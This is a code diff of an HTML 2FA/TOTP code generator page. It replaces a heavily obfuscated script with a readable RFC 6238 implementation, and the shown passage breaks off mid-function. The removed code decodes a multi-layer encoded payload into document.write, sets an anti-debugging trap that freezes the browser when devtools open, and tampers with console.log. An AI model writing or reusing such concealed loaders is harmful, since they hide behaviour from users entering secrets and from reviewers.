@@ -1,57 +1,574 @@
-<!DOCTYPE html>
-    <html>
-    <head><meta charset="UTF-8"></head>
-    <body>
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>2FA 验证码生成器</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      :root {
+        --blue: #2563eb;
+        --blue-dark: #1e40af;
+        --green: #16a34a;
+        --yellow: #eab308;
+        --red: #dc2626;
+        --zinc-50: #fafafa;
+        --zinc-100: #f4f4f5;
+        --zinc-200: #e4e4e7;
+        --zinc-300: #d4d4d8;
+        --zinc-500: #71717a;
+        --zinc-600: #52525b;
+        --zinc-700: #3f3f46;
+        --zinc-900: #18181b;
+      }
+
+      body {
+        font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI",
+          "Noto Sans", Helvetica, Arial, sans-serif;
+        background: var(--zinc-100);
+        color: var(--zinc-900);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+
+      .card {
+        width: 100%;
+        max-width: 440px;
+        background: #fff;
+        border: 1px solid var(--zinc-200);
+        border-radius: 12px;
+        padding: 32px 28px;
+        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.04);
+      }
+
+      h1 {
+        font-size: 20px;
+        font-weight: 600;
+        color: var(--zinc-900);
+        text-align: center;
+      }
+
+      .subtitle {
+        margin-top: 6px;
+        font-size: 13px;
+        color: var(--zinc-500);
+        text-align: center;
+      }
+
+      .field {
+        margin-top: 24px;
+      }
+
+      .label {
+        display: block;
+        font-size: 12px;
+        font-weight: 500;
+        color: var(--zinc-600);
+        margin-bottom: 8px;
+      }
+
+      .input-wrap {
+        position: relative;
+        display: flex;
+        align-items: center;
+      }
+
+      .input {
+        flex: 1;
+        width: 100%;
+        font-family: "JetBrains Mono", "SFMono-Regular", Menlo, Consolas,
+          monospace;
+        font-size: 14px;
+        color: var(--zinc-900);
+        background: #fff;
+        border: 1px solid var(--zinc-300);
+        border-radius: 8px;
+        padding: 10px 40px 10px 12px;
+        outline: none;
+        transition: border-color 0.15s, box-shadow 0.15s;
+      }
+
+      .input:focus {
+        border-color: var(--blue);
+        box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.12);
+      }
+
+      .input::placeholder {
+        color: #a1a1aa;
+        font-family: inherit;
+      }
+
+      .clear-btn {
+        position: absolute;
+        right: 8px;
+        top: 50%;
+        transform: translateY(-50%);
+        background: transparent;
+        border: none;
+        cursor: pointer;
+        color: var(--zinc-500);
+        padding: 4px;
+        border-radius: 4px;
+        display: none;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .clear-btn:hover {
+        color: var(--zinc-900);
+        background: var(--zinc-100);
+      }
+
+      .clear-btn.show {
+        display: flex;
+      }
+
+      .code-area {
+        margin-top: 24px;
+        padding: 24px 20px;
+        background: var(--zinc-50);
+        border: 1px solid var(--zinc-200);
+        border-radius: 10px;
+        text-align: center;
+      }
+
+      .code-label {
+        font-size: 12px;
+        color: var(--zinc-500);
+        margin-bottom: 10px;
+      }
+
+      .code {
+        font-family: "JetBrains Mono", "SFMono-Regular", Menlo, Consolas,
+          monospace;
+        font-size: 44px;
+        font-weight: 700;
+        letter-spacing: 0.12em;
+        color: var(--zinc-900);
+        line-height: 1.1;
+      }
+
+      .code .sep {
+        color: var(--zinc-300);
+        margin: 0 4px;
+      }
+
+      .code.empty {
+        color: var(--zinc-300);
+        letter-spacing: 0.2em;
+      }
+
+      .meta {
+        margin-top: 12px;
+        font-size: 12px;
+        color: var(--zinc-500);
+        min-height: 18px;
+      }
+
+      .meta .countdown {
+        font-family: "JetBrains Mono", monospace;
+        font-weight: 600;
+      }
+
+      .meta .countdown.warn {
+        color: var(--yellow);
+      }
+
+      .meta .countdown.danger {
+        color: var(--red);
+      }
+
+      .actions {
+        margin-top: 20px;
+        display: flex;
+        gap: 10px;
+      }
+
+      .btn {
+        flex: 1;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        font-size: 14px;
+        font-weight: 500;
+        padding: 10px 14px;
+        border-radius: 8px;
+        cursor: pointer;
+        border: 1px solid transparent;
+        transition: background 0.15s, border-color 0.15s, color 0.15s;
+        font-family: inherit;
+      }
+
+      .btn:disabled {
+        cursor: not-allowed;
+        opacity: 0.5;
+      }
+
+      .btn-primary {
+        background: var(--blue);
+        color: #fff;
+      }
+
+      .btn-primary:hover:not(:disabled) {
+        background: var(--blue-dark);
+      }
+
+      .btn-primary.copied {
+        background: var(--green);
+      }
+
+      .btn-outline {
+        background: #fff;
+        color: var(--zinc-700);
+        border-color: var(--zinc-300);
+      }
+
+      .btn-outline:hover:not(:disabled) {
+        background: var(--zinc-50);
+      }
+
+      .icon {
+        width: 16px;
+        height: 16px;
+        flex-shrink: 0;
+      }
+
+      .hint {
+        margin-top: 18px;
+        font-size: 11px;
+        color: var(--zinc-500);
+        text-align: center;
+        line-height: 1.5;
+      }
+
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 4px;
+        font-size: 11px;
+        color: var(--zinc-600);
+        background: var(--zinc-100);
+        border: 1px solid var(--zinc-200);
+        padding: 3px 8px;
+        border-radius: 6px;
+        margin-top: 14px;
+      }
+
+      .footer-note {
+        text-align: center;
+        margin-top: 8px;
+      }
+
+      @media (max-width: 480px) {
+        .card {
+          padding: 24px 20px;
+        }
+        .code {
+          font-size: 36px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <h1>2FA 验证码生成器</h1>
+      <p class="subtitle">输入 TOTP 密钥，自动生成 6 位验证码</p>
+
+      <div class="field">
+        <label class="label" for="secret">密钥（Base32）</label>
+        <div class="input-wrap">
+          <input
+            id="secret"
+            class="input"
+            type="text"
+            placeholder="粘贴或输入密钥"
+            autocomplete="off"
+            spellcheck="false"
+          />
+          <button
+            class="clear-btn"
+            id="clearBtn"
+            type="button"
+            title="一键清空"
+            aria-label="清空"
+          >
+            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <line x1="18" y1="6" x2="6" y2="18"></line>
+              <line x1="6" y1="6" x2="18" y2="18"></line>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <div class="code-area">
+        <div class="code-label">当前验证码</div>
+        <div class="code empty" id="code">------</div>
+        <div class="meta" id="meta">输入密钥后自动生成</div>
+      </div>
+
+      <div class="actions">
+        <button class="btn btn-outline" id="copyBtn" type="button" disabled>
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+          </svg>
+          <span id="copyText">手动复制</span>
+        </button>
+      </div>
+
+      <div class="footer-note">
+        <span class="badge">
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+
+      <p class="hint">
+        验证码每 30 秒自动刷新 · 生成后自动复制到剪贴板
+      </p>
+    </div>
+
     <script>
-    function _decode(str) {
-        return [...str].map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
-      }
-    const _encryptedAntiLog = 'dpotu!`boujEfcvhTubsu!>!ofx!Ebuf)*/hfuUjnf)*<efcvhhfs<dpotu!`boujEfcvhFoe!>!ofx!Ebuf)*/hfuUjnf)*<jg!)`boujEfcvhFoe!.!`boujEfcvhTubsu!?!211*!|!xijmf)usvf*|~!~!dpotu!`psjhjobmMph!>!dpotpmf/mph<dpotpmf/mph!>!gvodujpo)///bsht*!|dpotu!`qspdfttfeBsht!>!bsht/nbq)bsh!>?!|jg!)bsh!>>>!xjoepx/`1y2:!}}!bsh!>>>!xjoepx/`1y28*!|sfuvso!(\溑砂巳俞报－禂正dpotpmf扔危^(<~jg!)bsh!>>>!xjoepx/`1y29!}}!bsh!>>>!xjoepx/`1y27*!|sfuvso!(\觤寇凾敱巳俞报^(<~sfuvso!bsh<~*<`psjhjobmMph/bqqmz)dpotpmf-!`qspdfttfeBsht*<~<mfu!`sfbmEfdszquSftvmu!>!((<Pckfdu/efgjofQspqfsuz)xjoepx-!(`1y2:(-!|hfu;!gvodujpo)*!|dpotu!`tubdl!>!ofx!Fssps)*/tubdl<jg!)`tubdl!\'\'!`tubdl/jodmveft)(dpotpmf/mph(**!|sfuvso!(\禂正dpotpmf诼受`1y2:^(<~sfuvso!`sfbmEfdszquSftvmu<~-tfu;!gvodujpo)wbm*!|`sfbmEfdszquSftvmu!>!wbm<~-dpogjhvsbcmf;!gbmtf-fovnfsbcmf;!gbmtf~*<';
-    const _antiLogCode = _decode(_encryptedAntiLog);
-    try {
-      eval(_antiLogCode);
-    } catch (e) {
-      console.error("Anti-log initialization failed:", e);
-    }
-    const _0xa = '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';
-    const _0xb = 'ilti91hb';
-    function _0xc(_0xd) {
-      return decodeURIComponent(atob(_0xd).split('').map(c => '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
-    }
-    const _0xe = _0xc(_0xa);
-    function _0x11(str) {
-      const noiseMarkIndex = str.lastIndexOf('[NOISE:');
-      if (noiseMarkIndex === -1) return str;
-      const lenStart = noiseMarkIndex + 7;
-      const lenEnd = str.indexOf(']', lenStart);
-      const noiseLen = parseInt(str.slice(lenStart, lenEnd));
-      return str.slice(0, noiseMarkIndex);
-    }
-    const _0x12 = _0x11(_0xe);
-    function _0xf(_0x10) {
-      return [..._0x10].map(c => String.fromCharCode(c.charCodeAt(0) - 3)).join('');
-    }
-    const _0x13 = _0xf(_0x12);
-    function _0x14(str, key) {
-      return [...str].map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ key[i % key.length].charCodeAt(0))).join('');
-    }
-    const _0x15 = _0x14(_0x13, _0xb);
-    function _0x16(str) {
-      let res = '';
-      for (let i = 0; i < str.length; i += 4) {
-        res += str.slice(i, i+4).split('').reverse().join('');
-      }
-      return res;
-    }
-    const _0x17 = _0x16(_0x15);
-    function _0x18(str) {
-      const map = {'a':'z','z':'a','0':'9','9':'0','<':'>','>':'<','{':'}','}':'{','[':']',']':'['};
-      return [...str].map(c => map[c] || c).join('');
-    }
-    var _0x19;
-    _0x19 = _0x18(_0x17);
-    // 
-    document.write(_0x19);
+      (function () {
+        "use strict";
+        const PERIOD = 30;
+        const DIGITS = 6;
+        const BASE32_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
+
+        const secretInput = document.getElementById("secret");
+        const clearBtn = document.getElementById("clearBtn");
+        const codeEl = document.getElementById("code");
+        const metaEl = document.getElementById("meta");
+        const copyBtn = document.getElementById("copyBtn");
+        const copyText = document.getElementById("copyText");
+
+        let lastCode = "";
+        let lastSecret = "";
+        let copyResetTimer = null;
+        // 请求序号，用于避免异步竞态（快速输入时旧请求覆盖新结果）
+        let reqId = 0;
+
+        // Base32 解码（RFC 4648），返回字节数组
+        function base32Decode(input) {
+          const cleaned = input.replace(/[\s=]/g, "").toUpperCase();
+          let bits = 0;
+          let value = 0;
+          const output = [];
+          for (let i = 0; i < cleaned.length; i++) {
+            const idx = BASE32_ALPHABET.indexOf(cleaned[i]);
+            if (idx === -1) continue;
+            value = (value << 5) | idx;
+            bits += 5;
+            if (bits >= 8) {
+              output.push((value >>> (bits - 8)) & 0xff);
+              bits -= 8;
+            }
+          }
+          return new Uint8Array(output);
+        }
+
+        // Base32 校验（A-Z, 2-7，允许空格/等号，长度 >= 8 有效字符）
+        function isValidBase32(s) {
+          const cleaned = s.replace(/[\s=]/g, "").toUpperCase();
+          return /^[A-Z2-7]{8,}$/.test(cleaned);
+        }
+
+        // HMAC-SHA1（基于 Web Crypto API）
+        async function hmacSha1(keyBytes, msgBytes) {
+          const cryptoKey = await crypto.subtle.importKey(
+            "raw",
+            keyBytes,
+            { name: "HMAC", hash: "SHA-1" },
+            false,
+            ["sign"]
+          );
+          const sig = await crypto.subtle.sign("HMAC", cryptoKey, msgBytes);
+          return new Uint8Array(sig);
+        }
+
+        // 真实 TOTP 生成（RFC 6238 / RFC 4226 HOTP 动态截取）
+        async function generateTOTP(secret, period, digits) {
+          const keyBytes = base32Decode(secret);
+          if (keyBytes.length === 0) return "";
+
+          const counter = Math.floor(Date.now() / 1000 / period);
+          // counter 转 8 字节大端序
+          const msgBytes = new Uint8Array(8);
+          const view = new DataView(msgBytes.buffer);
+          view.setUint32(0, Math.floor(counter / 0x100000000));
+          view.setUint32(4, counter >>> 0);
+
+          const hash = await hmacSha1(keyBytes, msgBytes);
+
+          // 动态截取（Dynamic Truncation）
+          const offset = hash[hash.length - 1] & 0x0f;
+          const binary =
+            ((hash[offset] & 0x7f) << 24) |
+            ((hash[offset + 1] & 0xff) << 16) |
+            ((hash[offset + 2] & 0xff) << 8) |
+            (hash[offset + 3] & 0xff);
+
+          const otp = binary % Math.pow(10, digits);
+          return otp.toString().padStart(digits, "0");
+        }
+
+        // 剩余秒数
+        function remainingSeconds() {
+          const t = Math.floor(Date.now() / 1000);
+          return PERIOD - (t % PERIOD);
+        }
+
+        // 渲染验证码
+        function renderCode(code) {
+          if (!code) {
+            codeEl.textContent = "------";
+            codeEl.classList.add("empty");
+            return;
+          }
+          codeEl.classList.remove("empty");
+          codeEl.innerHTML =
+            code.slice(0, 3) + '<span class="sep">-</span>' + code.slice(3, 6);
+        }
+
+        // 渲染倒计时
+        function renderCountdown() {
+          if (!lastCode) return;
+          const remaining = remainingSeconds();
+          const cls = remaining > 20 ? "" : remaining > 10 ? "warn" : "danger";
+          metaEl.innerHTML =
+            '剩余 <span class="countdown ' +
+            cls +
+            '">' +
+            remaining +
+            "</span> 秒后刷新";
+        }
+
+        // 复制到剪贴板
+        async function copyToClipboard(text) {
+          try {
+            await navigator.clipboard.writeText(text);
+            return true;
+          } catch (e) {
+            const ta = document.createElement("textarea");
+            ta.value = text;
+            ta.style.position = "fixed";
+            ta.style.opacity = "0";
+            document.body.appendChild(ta);
+            ta.select();
+            let ok = false;
+            try {
+              ok = document.execCommand("copy");
+            } catch (err) {}
+            document.body.removeChild(ta);
+            return ok;
+          }
+        }
+
+        // 复制反馈
+        function showCopied(isAuto) {
+          copyBtn.classList.add("copied");
+          copyText.textContent = isAuto ? "已自动复制" : "已复制";
+          copyBtn.disabled = false;
+          if (copyResetTimer) clearTimeout(copyResetTimer);
+          copyResetTimer = setTimeout(function () {
+            copyBtn.classList.remove("copied");
+            copyText.textContent = "手动复制";
+          }, 1500);
+        }
+
+        // 更新验证码与状态（异步）
+        async function update(autoCopy) {
+          const raw = secretInput.value.trim();
+          const secret = raw.replace(/[\s=]/g, "").toUpperCase();
+          clearBtn.classList.toggle("show", secretInput.value.length > 0);
+
